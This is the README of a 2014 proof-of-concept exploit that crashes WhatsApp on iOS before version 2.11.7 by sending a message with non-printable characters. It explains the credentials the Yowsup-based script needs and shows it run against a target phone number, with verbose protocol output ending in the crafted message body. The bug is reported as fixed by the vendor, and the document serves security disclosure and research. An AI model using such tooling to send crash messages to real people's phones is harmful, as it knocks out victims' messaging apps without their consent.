# WhatsApp < v2.11.7 Remote Crash

**Product**: WhatsApp  
**Vendor Homepage**: http://www.whatsapp.com  
**Vulnerable Version(s)**: 2.11.7 and prior on iOS    
**Tested on**: WhatsApp v2.11.7 on iPhone 5 running iOS 7.0.4  
**Solution Status**: Fixed by Vendor on v2.11.8  
**Date**: 8/04/2014  
  
**Authors**:

 * **Jaime Sánchez** ([@segofensiva](https://twitter.com/segofensiva "@segofensiva"))
 ```jsanchez (at) seguridadofensiva.com```
 * **Pablo San Emeterio** ([@psaneme](https://twitter.com/psaneme "@psaneme"))
 ```psaneme (at) gmail.com```
  
- - -

Custom message with non-printable characters will crash any **WhatsApp** client < v2.11.7 for **iOS**.

##  CONFIGURATION FILE
It uses Yowsup library, that provides us with the capabilities of registration, reading/sending messages, and even engaging in an interactive conversation over WhatsApp protocol.

You'll need to use your own Your configuration file. It should contain info about your login credentials to Whatsapp. This typically consist of 3 fields:

* **phone**:	Your full phone number including country code, without '+' or '00'
* **id**:		This field is used in registration calls (-r|-R|-e), and for login if you are trying to use an existing account that is setup on a physical device. Whatsapp has recently deprecated using IMEI/MAC to generate the account's password in updated versions of their clients. Use --v1 switch to try it anyway. Typically this field should contain the phone's IMEI if your account is setup on a Nokia or an Android device, or the phone's WLAN's MAC Address for iOS devices. If you are not trying to use existing credentials	or want to register, you can leave this field blank or set it to some random text.
* **password**:	Password to use for login. You obtain this password when you register using Yowsup or on mobile devices

## USAGE
Enter the phone number to send the custom crafted messages:
```
$ python iPhoneCrash.py 34XXXXXXXXX
Connecting to c2.whatsapp.net
Authed 34XXXXXXXXX
Sent message
```

You can also increse the level of verbosity:
```
$ python iPhoneCrash.py 34XXXXXXXXX -v
YowsupConnectionManager:	>>>>>>>>    AUTH CALLED
BinTreeNodeReader:	Reader init
Connecting to c2.whatsapp.net
WAuth:	Yowsup WAUTH-1 INIT
WAuth:	Starting stream
WAuth:	Sending Features
BinTreeNodeWriter:	Outgoing
BinTreeNodeWriter:	
<stream:features>
    <receipt_acks>
    </receipt_acks>
    <w:profile:picture type="all">
    </w:profile:picture>
    <w:profile:picture type="group">
    </w:profile:picture>
    <notification type="participant">
    </notification>
    <status>
    </status>
</stream:features>

WAuth:	Sending Auth
BinTreeNodeWriter:	Outgoing
BinTreeNodeWriter:	
<auth xmlns="urn:ietf:params:xml:ns:xmpp-sasl" user="34XXXXXXXXX" mechanism="WAUTH-1">
</auth>

WAuth:	Read stream start
WAuth:	Read features and challenge
BinTreeNodeReader:	Incoming
BinTreeNodeReader:	
<stream:features>
<receipt_acks>
</receipt_acks>
<w:profile:picture type="all">
</w:profile:picture>
</stream:features>

WAuth:	GOT FEATURES !!!!
BinTreeNodeReader:	Incoming
BinTreeNodeReader:	
<challenge xmlns="urn:ietf:params:xml:ns:xmpp-sasl">
...</challenge>

WAuth:	GOT CHALLENGE !!!!
WAuth:	Sending Response
BinTreeNodeWriter:	Outgoing
BinTreeNodeWriter:	
<response xmlns="urn:ietf:params:xml:ns:xmpp-sasl">
...</response>

WAuth:	Read success
BinTreeNodeReader:	Incoming
BinTreeNodeReader:	
<success status="active" kind="free" xmlns="urn:ietf:params:xml:ns:xmpp-sasl" creation="1358365985" t="1397399145" expiration="1421437985">...</success>

WAuth:	Login Status: success
WAuth:	Expires: 1421437985
WAuth:	Account type: free
WAuth:	Account status: active
Authed  34XXXXXXXXX
BinTreeNodeWriter:	Outgoing
BinTreeNodeWriter:	
<message to="34XXXXXXXXX@s.whatsapp.net" type="chat" id="XXXXXXXXXX-X">
<x xmlns="jabber:x:event">
<server>
</server>
</x>
<body>
����</body>
</message>

Sent message
```

## MORE INFO
Get more info in my blog post:
```
 	http://www.seguridadofensiva.com/2014/04/crash-en-whatsapp-para-iphone-en-versiones-inferiores-a-2.11.7.html
```

Or check the slides of the research / talk at RootedCON 2014:
```
    http://www.slideshare.net/segofensiva/whatsapp-mentiras-y-cintas-de-video-rootedcon-2014
```